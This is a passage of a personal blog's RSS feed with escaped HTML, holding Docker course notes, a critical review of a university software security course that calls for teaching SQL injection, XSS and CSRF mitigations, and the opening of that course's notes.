        &lt;li&gt;&lt;a href=&#34;#dockerfile&#34;&gt;Dockerfile&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#building-an-image&#34;&gt;Building an Image&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#running-an-image-in-a-container&#34;&gt;Running an Image in a Container&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/nav&gt;
&lt;/div&gt;

&lt;p&gt;This is an excerpt of my &lt;a href=&#34;https://blog.elijahlopez.ca/posts/university/cs-489-software-delivery/&#34;&gt;Software Delivery course notes&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Before learning Docker, it is best to figure out why we want to use Docker. We don&amp;rsquo;t want to force it down our throat unless it enables us to do more.&lt;/p&gt;
&lt;p&gt;Put simply, Docker enables creating specified environments, and reusing them. Projects can be compiled or run with one or two commands.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Without Docker, a guide would need to be followed manually to setup a dev environment&lt;/li&gt;
&lt;li&gt;With docker, developers can build/download an environment with the compiled project with one command and run the project with another command&lt;/li&gt;
&lt;/ul&gt;
&lt;details&gt;&lt;summary&gt;My use case&lt;/summary&gt;
&lt;p&gt;In my case, I have a music player, Music Caster which I want to port on Linux. Since it&amp;rsquo;s made with Python plus a tkinter custom add-on, there are several issues with setting up the development environment on Linux. One would need to install a non-system version of Python which is difficult on Debian based systems and then they would need to run a script to install one dependency on the system level but the rest virtually. Most importantly, I want to guarantee that when we compile the application for Linux that an important system dependency won&amp;rsquo;t be missing.&lt;/p&gt;
&lt;p&gt;We can use Docker to ensure that builds will always work with one command on new machines and don&amp;rsquo;t have to worry about getting it to work on all the different distros just to produce an executable anyways. The &lt;code&gt;Image&lt;/code&gt; in this case is an environment to run the deployment procedure rather than running the application itself.&lt;/p&gt;
&lt;/details&gt;
&lt;p&gt;Therefore, deployment simplifies to focusing on replacing the image which is running (as a container) rather than figuring out how to keep the  dependencies up to date as the project progresses (most applicable to languages that require a runtime such as .NET, Java, Python, NodeJS)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.docker.com/get-started/overview/&#34;&gt;Overview&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;Client (docker cli or desktop), Daemon (always running background service), and Registry (image storage)&lt;/li&gt;
&lt;li&gt;A container is an instance of an image&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Orchestration tool for containers with several features
&lt;ul&gt;
&lt;li&gt;Portability&lt;/li&gt;
&lt;li&gt;App-centric&lt;/li&gt;
&lt;li&gt;Builds from &amp;ldquo;source&amp;rdquo;&lt;/li&gt;
&lt;li&gt;Versioning&lt;/li&gt;
&lt;li&gt;Component reuse&lt;/li&gt;
&lt;li&gt;Public registry&lt;/li&gt;
&lt;li&gt;Tool ecosystem&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;details&gt;&lt;summary&gt;Jekyll Dockerfile&lt;/summary&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Dockerfile&#34; data-lang=&#34;Dockerfile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;FROM&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;jekyll/jekyll:3.8.6&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# the base image sets the working directory to /srv/jekyll&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# the base image already uses EXPOSE 4000&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;COPY&lt;/span&gt; . .&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;RUN&lt;/span&gt; bundle install&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;CMD&lt;/span&gt; bundle &lt;span style=&#34;color:#24909d&#34;&gt;exec&lt;/span&gt; jekyll serve&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/details&gt;
&lt;h2 id=&#34;quick-reference&#34; &gt;Quick Reference
&lt;span&gt;
    &lt;a href=&#34;#quick-reference&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;dockerfile&#34; &gt;Dockerfile
&lt;span&gt;
    &lt;a href=&#34;#dockerfile&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Dockerfile: a instruction sheet that docker will parse to build an &lt;code&gt;Image&lt;/code&gt;; an isolated environment&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Typically, each line is a new layer that can be cached
&lt;ul&gt;
&lt;li&gt;When a line is changed or a reference to the host on a line is modified, that layer and the layers below it are rebuilt&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ENV VAR=value&lt;/code&gt;: a way to define environment variables (usage: &lt;code&gt;$VAR&lt;/code&gt;)
&lt;ul&gt;
&lt;li&gt;We want to define environment variables just before where they are used to minimize rebuilds (an exception can be made if it&amp;rsquo;s permanent)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;FROM&lt;/code&gt;: an image to build off of. If we want to run an application, we would need an operating system. I recommend &lt;code&gt;almalinux&lt;/code&gt;, an RHEL-ABI equivalent which is downstream from CentOS Stream which is downstream from Fedora. Ideally the &amp;ldquo;server&amp;rdquo; distro is the same OS family as your preferred desktop distro, so that you learn one way to operate a system.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;COPY&lt;/code&gt;: copy files from host into the image
&lt;ul&gt;
&lt;li&gt;This is a layer where changing files on the host can trigger a rebuild of the layer and subsequent layers&lt;/li&gt;
&lt;li&gt;We want to COPY the absolute minimum into the image such as just the dependency list and lock file (package.json, yarn.lock, requirements.txt, custom whl files, Pipfile, Pipfile.lock)&lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;.dockerignore&lt;/code&gt; (similar syntax as &lt;code&gt;.gitignore&lt;/code&gt;) to ignore files such as the &lt;code&gt;.git/&lt;/code&gt; dir&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RUN&lt;/code&gt;: execute shell (root by default) during build process&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CMD&lt;/code&gt;: command to execute when an image is started in a container
&lt;ul&gt;
&lt;li&gt;use &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; to run multiple commands&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;\&lt;/code&gt; for multiline commands (&lt;code&gt;RUN&lt;/code&gt; and &lt;code&gt;CMD&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;building-an-image&#34; &gt;Building an Image
&lt;span&gt;
    &lt;a href=&#34;#building-an-image&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;docker build .&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Docker enables caching. Therefore, we want to include any system dependency &lt;code&gt;update&lt;/code&gt; and an &lt;code&gt;install&lt;/code&gt; in the same &lt;code&gt;RUN&lt;/code&gt; (e.g. apt)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/elibroftw/music-caster/blob/master/Dockerfile#L7&#34;&gt;dnf example in Music Caster&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;running-an-image-in-a-container&#34; &gt;Running an Image in a Container
&lt;span&gt;
    &lt;a href=&#34;#running-an-image-in-a-container&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://docs.docker.com/reference/cli/docker/container/run/&#34;&gt;docker container run | Docker Docs&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;docker run --rm -p 4000:4000 tagOrId&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;&amp;lsquo;&amp;ndash;rm&amp;rsquo;: removes the container after it has stopped
&lt;ul&gt;
&lt;li&gt;A container stops once the CMD has finished running or if we decide to stop it manually and of course if an unexpected error occurs&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p&lt;/code&gt;: open the localhost container port&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-d&lt;/code&gt;: run the container as a daemon (keep using the shell)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;docker tag source copy&lt;/code&gt; to clone the image (e.g. prepping for new push to a remote registry)&lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;docker push tag&lt;/code&gt; to push to a registry
&lt;ul&gt;
&lt;li&gt;Registry tags are usually of the form &lt;code&gt;{username}/{name}:{version}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use &amp;ndash;volume src:dest to copy a directory on the host machine to a directory on the container. This way we can persist data without deleting the volume&lt;/li&gt;
&lt;li&gt;We can also limit the system resources available to the container (&lt;a href=&#34;https://docs.docker.com/config/containers/resource_constraints/#limit-a-containers-access-to-memory&#34;&gt;read more&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;If the container is running, you can use &lt;code&gt;docker exec -it containerId sh&lt;/code&gt; to access the shell &lt;code&gt;sh&lt;/code&gt; is symlinked to inside a &lt;strong&gt;running&lt;/strong&gt; container (not necessarily bash, so be careful)&lt;/li&gt;
&lt;li&gt;If the container immediately exits, we need to set an entrypoint
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;docker run --rm -it --entrypoint bash image&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;i&lt;/code&gt;: interactive&lt;/li&gt;
&lt;li&gt;&lt;code&gt;t&lt;/code&gt;: Allocate a pseudo-TTY&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>CS 489 Software and Systems Security Review</title>
      <link>https://blog.elijahlopez.ca/posts/university/cs-489-software-and-systems-security-review/</link>
      <pubDate>Wed, 03 Apr 2024 14:49:36 -0400</pubDate>
      
      <guid>https://blog.elijahlopez.ca/posts/university/cs-489-software-and-systems-security-review/</guid>
      <description>&lt;p&gt;I took CS 489/698 Software and Systems Security this past Winter term (2024) and I have to say, it&amp;rsquo;s in the top 5 courses that have been a waste of time, money, and stress. I do not recommend it. 3/4 Assignments are related to the content but they expect you to learn from google and LLMs to figure out how to solve them, even though the starting directives are not enough.&lt;/p&gt;
&lt;h2 id=&#34;assignment-criticism&#34; &gt;Assignment Criticism
&lt;span&gt;
    &lt;a href=&#34;#assignment-criticism&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;In the first assignment, there&amp;rsquo;s a buffer overflow but we were only taught how to do it on a 32-bit system where the vulnerability was in the main method versus the assignment where the vulnerability is in another function and on 64-bit program. &lt;del&gt;Not to mention, that they don&amp;rsquo;t mention during class anything about the gcc options-fstack-protector and -fno-stack-protector and how it&amp;rsquo;s the fault of certain (idk which ones) linux distros &lt;a href=&#34;https://stackoverflow.com/a/10713028/7732434&#34;&gt;see here&lt;/a&gt;.&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;In the second assignment, the assignment tried to be situational, but in my opinion, it would be much more effective if instead of having a bunch of classes on the content, the class itself was situational and we were put in groups to simulate how things go wrong. This would&amp;rsquo;ve been much more effective, similar to scenes in Mr. Robot where we see social and technical vulnerabilities being exploited. It would be nice to see an actual device exploited by a USB and/or disc in class rather than just be told that this is an existing potential weakness to be exploited.&lt;/p&gt;
&lt;p&gt;In the third assignment, we had to learn about the various fuzzers. The biggest problems with this assignment is that it takes hours to setup the environment (100GB), and we aren&amp;rsquo;t given docs on the various fuzzers. We have to create code with bugs that won&amp;rsquo;t be detected by the fuzzers. The biggest problem is that for one of the fuzzers, it would work locally but not on their test servers which would report character comparisons as a crash&amp;hellip;
In the fourth assignment, we are given seccom-bpf sandboxes and are told to make a program that can read and print out a specific file&amp;rsquo;s contents. The only issues was I had no idea that open corresponded to the open_at system call, otherwise I could&amp;rsquo;ve done 3/4ths of the assignment.
In class we are only taught that these sandboxes exist, and the piazza post states to use &lt;code&gt;seccom-tools&lt;/code&gt;. Yeah, I have quizzes and other projects to do, I don&amp;rsquo;t think spending hours just to maintain a high mark in the course is a good enough motivation to sink hours. It&amp;rsquo;s not satisfying and it&amp;rsquo;s a deterioration of my mental health which in my humble opinion should be prioritized over school most of the time.&lt;/p&gt;
&lt;h2 id=&#34;content-criticism&#34; &gt;Content Criticism
&lt;span&gt;
    &lt;a href=&#34;#content-criticism&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;Let&amp;rsquo;s review some content shall we, and compare it to my own experience related to security.&lt;/p&gt;
&lt;h3 id=&#34;firewalls-what-are-those&#34; &gt;Firewalls? What are those?
&lt;span&gt;
    &lt;a href=&#34;#firewalls-what-are-those&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;When discussing Operating System Security, you&amp;rsquo;d think encryption of disk and firewalls would be mentioned, except you&amp;rsquo;d be wrong. Although not a real criticism, the history of &lt;code&gt;ssh&lt;/code&gt; isn&amp;rsquo;t mentioned.&lt;/p&gt;
&lt;p&gt;The firewall that comes with Ubuntu is &lt;code&gt;ufw&lt;/code&gt; and the firewall that comes with Red Hate Entreprise variants is &lt;code&gt;firewalld&lt;/code&gt;. We should be taught how to secure production applications but instead we go through this program and might end up developing startup software that has severe vulnerabilities.&lt;/p&gt;
&lt;h3 id=&#34;sql-injection-mitigation&#34; &gt;SQL Injection Mitigation
&lt;span&gt;
    &lt;a href=&#34;#sql-injection-mitigation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Although SQL injection is mentioned, the course does not educate people on how to properly mitigate the issue. The only thing given is the %s which is a raw SQL statement and not something we usually do in Python. I highly suggest the course amend their slides so that mitigation&amp;rsquo;s in common programming languages: Rust, C#, Java, and Python are shown.&lt;/p&gt;
&lt;p&gt;For reference, one of my group mates in a previous course who works at a $1T+ company committed unsecure code and would fix the SQL injection only in a commit days later.&lt;/p&gt;
&lt;h3 id=&#34;cross-site-scripting-attack-xss-mitigation&#34; &gt;Cross Site Scripting Attack (XSS) Mitigation
&lt;span&gt;
    &lt;a href=&#34;#cross-site-scripting-attack-xss-mitigation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;XSS (Cross site scripting attack) is mentioned but focuses more on client-side mediation rather than server-side mediation
&lt;ul&gt;
&lt;li&gt;The best example of XSS is someone submitting a script tag in a comment&lt;/li&gt;
&lt;li&gt;Rather than focus on how to best escape untrusted input, the instructor just says &amp;ldquo;do very careful checks.&amp;rdquo; This is wrong.&lt;/li&gt;
&lt;li&gt;The best way to mitigate an XSS is to make sure your whatever you are using to generate the HTML escapes all variables unless they are explicitly marked as &amp;ldquo;safe&amp;rdquo;. For example in Jinaj2, all values are escaped by default, so if you want to add custom HTML, you need to supply &lt;code&gt;{{ data | safe }}&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;cross-site-request-forgery&#34; &gt;Cross Site Request Forgery
&lt;span&gt;
    &lt;a href=&#34;#cross-site-request-forgery&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;One of the most dangerous attacks that can be easily deployed in production is not mentioned. To illustrate how dangerous this attack is, imagine a bank had a form that you can send money to someone. A CSRF vulnerability would allow clicking a button on another website to straight up hijack that request.&lt;/p&gt;
&lt;p&gt;By not teaching students about the existence of how CSRF vulnerabilities come to be and how to mitigate (form tokens) them, the school&amp;rsquo;s creating software developers who will create vast vulnerabilities while thinking they are highly aware of common security vulnerabilities. So instead of  developers being humble about the lack of security in their code, they will have large egos that their code can&amp;rsquo;t have vulnerabilities since they got 100% in the security course at the &amp;ldquo;prestigious&amp;rdquo; University of Waterloo.&lt;/p&gt;
&lt;h2 id=&#34;final-thoughts&#34; &gt;Final Thoughts
&lt;span&gt;
    &lt;a href=&#34;#final-thoughts&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;At the end of the day, the course does not prepare us for the real world. The best advice the course can give you is a) choose Rust over C and C++ in side projects and in production projects; b) don&amp;rsquo;t be shy in using a different framework than the norm as genetic diversity does reduce the spread of an exploit.&lt;/p&gt;
&lt;p&gt;Lastly, I recommend taking Privacy, Cryptography, Network, and Data Security instead. A much healthier course to take it seems. I&amp;rsquo;ve downloaded the slides, so I will study it myself alongside the networks course I&amp;rsquo;m taking next term.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>CS 489 Security</title>
      <link>https://blog.elijahlopez.ca/posts/university/cs-489-security/</link>
      <pubDate>Tue, 09 Jan 2024 11:33:24 -0500</pubDate>
      
      <guid>https://blog.elijahlopez.ca/posts/university/cs-489-security/</guid>
      <description>&lt;h2 id=&#34;introduction&#34; &gt;Introduction
&lt;span&gt;
    &lt;a href=&#34;#introduction&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;assignments&#34; &gt;Assignments
&lt;span&gt;
    &lt;a href=&#34;#assignments&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;4 &lt;a href=&#34;https://cs.uwaterloo.ca/~m285xu/courses/cs489-w24/assignments/&#34;&gt;Assignments&lt;/a&gt; worth 25% each&lt;/li&gt;
&lt;li&gt;Written and/or programming&lt;/li&gt;
&lt;li&gt;Start ASAP&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Assignment&lt;/th&gt;
          &lt;th&gt;Start Date&lt;/th&gt;
          &lt;th&gt;Due Date&lt;/th&gt;
          &lt;th&gt;Days Given&lt;/th&gt;
          &lt;th&gt;Grade Weight&lt;/th&gt;
